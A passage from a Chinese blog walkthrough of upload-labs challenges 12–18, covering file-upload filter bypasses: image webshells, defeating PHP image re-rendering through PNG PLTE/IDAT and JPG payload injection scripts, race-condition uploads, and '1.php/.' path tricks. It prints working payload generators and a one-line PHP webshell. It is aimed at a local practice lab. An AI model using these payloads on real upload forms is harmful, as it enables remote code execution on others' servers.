+<p>(post传输):post传输和get传输差不多，不过需要转一下码如图，然后发送发现上传成功。</p>
+<p><img src="https://Lmg66.github.io/img/36.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/37.png" alt="图片"></p>
+<h3 id="十二-图片木马"><a href="#十二-图片木马" class="headerlink" title="十二.图片木马"></a>十二.图片木马</h3><p>查看源码：采用白名单限制上传的只能是图片，故考虑图片木马。</p>
+<p><img src="https://Lmg66.github.io/img/38.png" alt="图片"></p>
+<p>图片木马的制作:</p>
+<pre><code>1. windows下cmd命名 Copy 1.jpg/b+shell.php/a shell.jpg
+
+2.右键图片选择属性，详细信息，版权处加入木马，如图
+
+3.16进制文本编译器</code></pre><p><img src="https://Lmg66.github.io/img/39.png" alt="图片"></p>
+<p>上传图片木马：上传成功后采用文件包含即可</p>
+<p><img src="https://Lmg66.github.io/img/40.png" alt="图片"></p>
+<h3 id="十三-图马-getimagesize"><a href="#十三-图马-getimagesize" class="headerlink" title="十三.图马 getimagesize()"></a>十三.图马 getimagesize()</h3><p>查看源码：</p>
+<p><img src="https://Lmg66.github.io/img/41.png" alt="图片"></p>
+<p>getimagesize()函数：</p>
+<pre><code>     用于取得图像大小，如果指定的图像或其不是有效的图像，getimagesize()将返回false并产生一条E_WARNING级的错误</code></pre><p>Image_type_to_extension()</p>
+<pre><code>     用于取得图像类型的文件后缀</code></pre><p>绕过方法: 上传图马木马即可</p>
+<h3 id="十四-图马-exif-imagetype"><a href="#十四-图马-exif-imagetype" class="headerlink" title="十四.图马 exif_imagetype()"></a>十四.图马 exif_imagetype()</h3><p>查看源码:</p>
+<p><img src="https://Lmg66.github.io/img/58.png" alt="图片"></p>
+<p>exif_imagetype()函数：</p>
+<pre><code>用于判断一个图像的类型，正常则返回签名对应常量，否则返回false</code></pre><p>绕过方法：上传图片木马即可</p>
+<h3 id="十五-图马-二次渲染"><a href="#十五-图马-二次渲染" class="headerlink" title="十五.图马 二次渲染"></a>十五.图马 二次渲染</h3><h4 id="查看源码-对gif的过滤部分：发现gif图片被二次渲染"><a href="#查看源码-对gif的过滤部分：发现gif图片被二次渲染" class="headerlink" title="查看源码 对gif的过滤部分：发现gif图片被二次渲染"></a>查看源码 对gif的过滤部分：发现gif图片被二次渲染</h4><p><img src="https://Lmg66.github.io/img/42.png" alt="图片"></p>
+<p>尝试上传gif(带有木马)，并将上传</p>
+<p><img src="https://Lmg66.github.io/img/43.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/44.png" alt="图片"></p>
+<p>gif绕过:找到渲染前后没有变化的位置，然后将php木马写入即可，下载上传后的gif，发现木马上传成功</p>
+<p><img src="https://Lmg66.github.io/img/45.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/46.png" alt="图片"></p>
+<h4 id="查看源码：对png的过滤部分-发现被二次渲染"><a href="#查看源码：对png的过滤部分-发现被二次渲染" class="headerlink" title="查看源码：对png的过滤部分 发现被二次渲染"></a>查看源码：对png的过滤部分 发现被二次渲染</h4><p><img src="https://Lmg66.github.io/img/47.png" alt="图片"></p>
+<p>尝试上传带有一句话木马的png图片，上传下载发现木马被渲染掉</p>
+<p><img src="https://Lmg66.github.io/img/48.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/49.png" alt="图片"></p>
+<p>绕过方法：</p>
+<p>1.写入php代码到PLTE模块</p>
+<p>PLTE模块:调色板PLTE数据块是辅助数据快，对于索引图像，调试板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p>
+<p>PLTE模块是辅助模块并不是每个png图片都有的，多找几个png图片</p>
+<p><img src="https://Lmg66.github.io/img/50.png" alt="图片"></p>
+<p>然后计算PLTE数据块的CRC</p>
+<pre><code>import binascii
+import re
+png = open(r&#39;2.png&#39;,&#39;rb&#39;)
+a = png.read()
+png.close()
+hexstr = binascii.b2a_hex(a)
+&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
+data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
+crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
+print hex(crc)</code></pre><p>运行结果写入CRC模块</p>
+<p><img src="https://Lmg66.github.io/img/51.png" alt="图片"></p>
+<p>然后上传即可；注：CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。储存用来检测是否有错误的循环冗余码。参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p>
+<p>2.写入IDAT数据块</p>
+<p>国外大佬脚本直接用</p>
+<pre><code>&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+$img = imagecreatetruecolor(32, 32);
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+imagepng($img,&#39;./1.png&#39;);
+?&gt;</code></pre><p>运行脚本生成1.png，发现木马<?=$_GET[0]($_POST[1]);?>被写入</p>
+<p><img src="https://Lmg66.github.io/img/52.png" alt="图片"></p>
+<p>上传利用：文件包含</p>
+<p><img src="https://Lmg66.github.io/img/53.png" alt="图片"></p>
+<p>图片原理：<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
+<p>木马原理：assert()会检查内部是否是字符串，如果是字符串，它将会被assert()当做php代码执行</p>
+<h4 id="查看源码-对jpg的过滤部分-发现对jpg图片进行二次渲染"><a href="#查看源码-对jpg的过滤部分-发现对jpg图片进行二次渲染" class="headerlink" title="查看源码 对jpg的过滤部分 发现对jpg图片进行二次渲染"></a>查看源码 对jpg的过滤部分 发现对jpg图片进行二次渲染</h4><p><img src="https://Lmg66.github.io/img/54.png" alt="图片"></p>
+<p>绕过姿势:先随便上传一个1.jpg图片到服务器，将上传后的图片下载，用国外大佬脚本处理一下（并不是所有图片都能被脚本处理插入木马多试几个）</p>
+<p>处理cmd命令：php 脚本名.php 1.jpg（需要安装php环境）</p>
+<p>脚本被我改一下，发现大佬脚本不能用</p>
+<pre><code>&lt;?php
+
+    /*
+
+
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+
+
+    1) Upload an arbitrary image via secured files upload script
+
+    2) Save the processed image and launch:
+
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+
+
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+
+
+    Since the most straightforward injection method is used, the following problems can occur:
+
+    1) After the second processing the injected data may become partially corrupted.
+
+    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
+
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+
+
+    Sergey Bobrov @Black2Fan.
+
+
+
+    See also:
+
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+
+
+    */
+
+
+
+    $miniPayload = &quot;&lt;?php phpinfo();?&gt;&quot;;
+
+
+
+
+
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
+
+        die(&#39;php-gd is not installed&#39;);
+
+    }
+
+
+
+    if(!isset($argv[1])) {
+
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+
+    }
+
+
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+
+        $nullbytePayloadSize = $pad;
+
+        $dis = new DataInputStream($argv[1]);
+
+        $outStream = file_get_contents($argv[1]);
+
+        $extraBytes = 0;
+
+        $correctImage = TRUE;
+
+
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+
+            die(&#39;Incorrect SOI marker&#39;);
+
+        }
+
+
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+
+            $marker = $dis-&gt;readByte();
+
+            $size = $dis-&gt;readShort() - 2;
+
+            $dis-&gt;skip($size);
+
+            if($marker === 0xDA) {
+
+                $startPos = $dis-&gt;seek();
+
+                $outStreamTmp = 
+
+                    substr($outStream, 0, $startPos) . 
+
+                    $miniPayload . 
+
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+
+                    substr($outStream, $startPos);
+
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+
+                if($extraBytes !== 0) {
+
+                    while((!$dis-&gt;eof())) {
+
+                        if($dis-&gt;readByte() === 0xFF) {
+
+                            if($dis-&gt;readByte !== 0x00) {
+
+                                break;
+
+                            }
+
+                        }
+
+                    }
+
+                    $stopPos = $dis-&gt;seek() - 2;
+
+                    $imageStreamSize = $stopPos - $startPos;
+
+                    $outStream = 
+
+                        substr($outStream, 0, $startPos) . 
+
+                        $miniPayload . 
+
+                        substr(
+
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+
+                                substr($outStream, $startPos, $imageStreamSize),
+
+                            0,
+
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+
+                                substr($outStream, $stopPos);
+
+                } elseif($correctImage) {
+
+                    $outStream = $outStreamTmp;
+
+                } else {
+
+                    break;
+
+                }
+
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
+
+                    die(&#39;Success!&#39;);
+
+                } else {
+
+                    break;
+
+                }
+
+            }
+
+        }
+
+    }
+
+    unlink(&#39;payload_&#39;.$argv[1]);
+
+    die(&#39;Something\&#39;s wrong&#39;);
+
+
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+
+        global $correctImage;
+
+        file_put_contents($filename, $data);
+
+        $correctImage = TRUE;
+
+        imagecreatefromjpeg($filename);
+
+        if($unlink)
+
+            unlink($filename);
+
+        return $correctImage;
+
+    }
+
+
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+
+        global $extraBytes, $correctImage;
+
+        $correctImage = FALSE;
+
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
+
+            if(isset($m[1])) {
+
+                $extraBytes = (int)$m[1];
+
+            }
+
+        }
+
+    }
+
+
+
+    class DataInputStream {
+
+        private $binData;
+
+        private $order;
+
+        private $size;
+
+
+
+        public function __construct($filename, $order = false, $fromString = false) {
+
+            $this-&gt;binData = &#39;&#39;;
+
+            $this-&gt;order = $order;
+
+            if(!$fromString) {
+
+                if(!file_exists($filename) || !is_file($filename))
+
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+
+                $this-&gt;binData = file_get_contents($filename);
+
+            } else {
+
+                $this-&gt;binData = $filename;
+
+            }
+
+            $this-&gt;size = strlen($this-&gt;binData);
+
+        }
+
+
+
+        public function seek() {
+
+            return ($this-&gt;size - strlen($this-&gt;binData));
+
+        }
+
+
+
+        public function skip($skip) {
+
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+
+        }
+
+
+
+        public function readByte() {
+
+            if($this-&gt;eof()) {
+
+                die(&#39;End Of File&#39;);
+
+            }
+
+            $byte = substr($this-&gt;binData, 0, 1);
+
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+
+            return ord($byte);
+
+        }
+
+
+
+        public function readShort() {
+
+            if(strlen($this-&gt;binData) &lt; 2) {
+
+                die(&#39;End Of File&#39;);
+
+            }
+
+            $short = substr($this-&gt;binData, 0, 2);
+
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+
+            if($this-&gt;order) {
+
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+
+            } else {
+
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+
+            }
+
+            return $short;
+
+        }
+
+
+
+        public function eof() {
+
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+
+        }
+
+    }
+
+?&gt;</code></pre><p><img src="https://Lmg66.github.io/img/55.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/56.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/57.png" alt="图片"></p>
+<h3 id="十六-条件竞争"><a href="#十六-条件竞争" class="headerlink" title="十六.条件竞争"></a>十六.条件竞争</h3><p>查看源码：发现上传的文件先被存储在服务器，然后进行判断，如果不是jpg png gif 则unlik()删掉，是的话重命名</p>
+<p><img src="https://Lmg66.github.io/img/59.png" alt="图片"></p>
+<p>绕过姿势：在判断删除前，进行访问，竞争时间<br> shell.php 如下，当然也可写其他木马或者生成木马的php文件，上传用burpsuite抓包，当然可以写脚本</p>
+<p><img src="https://Lmg66.github.io/img/60.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/61.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/62.png" alt="图片"></p>
+<p>绕后构造访问连接：<a href="http://127.0.0.1/upload-labs-master/upload/shell.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/upload/shell.php</a>   用burpsuite抓包发送和上传一起开始  如何不行可以尝试线程调大点，或者写脚本</p>
+<p><img src="https://Lmg66.github.io/img/63.png" alt="图片"></p>
+<p>类似的也是先保存再重命名同样可以竞争 源码</p>
+<p><img src="https://Lmg66.github.io/img/64.png" alt="图片"></p>
+<h3 id="十七-绕过"><a href="#十七-绕过" class="headerlink" title="十七../绕过"></a>十七../绕过</h3><p>查看源码：</p>
+<p><img src="https://Lmg66.github.io/img/65.png" alt="图片"></p>
+<p>绕过姿势：<br>Pathinfo()会返回一个关联数组含有path的信息。例如：</p>
+<p><img src="https://Lmg66.github.io/img/66.png" alt="图片"></p>
+<p>save_name=1.php/.这样file_ext值为空绕过黑名单，而move_uploaded_file函数忽略文件后的./就可以实现保存文件为shell.php</p>
+<p><img src="https://Lmg66.github.io/img/67.png" alt="图片"></p>
+<p>注：网上看有用 save_name=1.php%00绕过的，虽然能上传成功但是保存的文件名是1.php%00你是没法利用的，看看原因好像是move_uploaded_file函数把save_name当做字符串来用的（目前感觉这个方法不行，可能操作有误）</p>
+<h3 id="十八-数组-绕过"><a href="#十八-数组-绕过" class="headerlink" title="十八.数组+./绕过"></a>十八.数组+./绕过</h3><p>查看源码：分析如图</p>
+<p><img src="https://Lmg66.github.io/img/68.png" alt="图片"></p>
+<p>绕过姿势：</p>
+<p><img src="https://Lmg66.github.io/img/69.png" alt="图片"></p>
+<p><img src="https://Lmg66.github.io/img/70.png" alt="图片"></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Lmg66.github.io" rel="external nofollow noreferrer">Lmg</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Lmg66.github.io/posts/4f5f.html">https://Lmg66.github.io/posts/4f5f.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://Lmg66.github.io" target="_blank">Lmg</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC80OTIwMS8yNTY5NQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/5fc7.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/10.jpg" class="responsive-img" alt="python小游戏-水文">
+                        
+                        <span class="card-title">python小游戏-水文</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            脚本不会，全都白费。所以就去学习了简单的python，结果不慎学了python中的pygame，浪费了不少时间，没啥用如果不做游戏个人觉得最好别学，学爬虫她不香吗？不过也有一点收获，打飞机小游戏，源码奉上（注意：安装pygame库哦！！！）
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/python/" class="post-category">
+                                    python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/python%E5%B0%8F%E6%B8%B8%E6%88%8F-%E6%89%93%E9%A3%9E%E6%9C%BA/">
+                        <span class="chip bg-color">python小游戏(打飞机)</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/832d.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/2.jpg" class="responsive-img" alt="文件包含补充CGI技术原理">
+                        
+                        <span class="card-title">文件包含补充CGI技术原理</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CGI技术原理1.1 CGI的提出CGI是外部扩展应用程序与WWW服务器交互的一个标准接口。按照CGI标准编写的外部扩展应用程序可以处理客户端（一般是WWW浏览器）输入的协同工作数据，完成客户端与服务器的交互操作。这在实际应用中非常有用，如
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
+                    </a>
+                    
+                    <a href="/tags/CGI%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">
+                        <span class="chip bg-color">CGI技术原理</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Script kiddie&#39;s life<br />'
+            + '文章作者: Lmg<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="https://Lmg66.github.io" target="_blank">Lmg</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+             <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-heart-o"></i> 本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>   <span id="busuanzi_container_site_uv" style='display:none'></span> 人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人. 
+
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "22";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+
+                setInterval(siteTime, 1000);
+            </script>
+
+            
+            <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script> 
+            <script type="text/javascript">  
+            document.write('欢迎来自:' + returnCitySN["cname"]+'的朋友' + ",您的IP:" + returnCitySN["cip"] + ",浏览器版本:"+getBrowserInfo());
+        function getBrowserInfo()
+{
+    var agent = navigator.userAgent.toLowerCase() ;
+    var regStr_ie = /msie [\d.]+;/gi ;
+    var regStr_ff = /firefox\/[\d.]+/gi
+    var regStr_chrome = /chrome\/[\d.]+/gi ;
